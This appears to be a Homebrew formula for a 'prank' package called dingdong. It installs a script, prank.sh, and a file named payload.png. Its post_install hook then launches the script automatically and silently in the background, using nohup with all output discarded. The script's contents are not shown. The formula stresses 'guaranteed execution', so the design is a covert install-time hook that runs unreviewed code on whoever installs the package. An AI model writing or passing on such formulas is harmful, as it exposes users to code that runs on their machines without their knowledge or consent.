class Dingdong < Formula
  desc "🎭 Karan's Ultimate Prank - Bulletproof guaranteed execution"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "3.4.0"
  sha256 "ef31867b10604d765fe37f934b0fbc906d6f416472b21214f76792904ce9c824"

  def install
    bin.install "prank.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "🎭 Karan's Ultimate Prank v3.4 - BULLETPROOF EDITION!"
    ohai "🚀 Simplified execution, guaranteed to work"
    
    # Background execution that won't hang installation
    system "nohup #{bin}/prank.sh #{pkgshare}/payload.png > /dev/null 2>&1 &"
  end
end
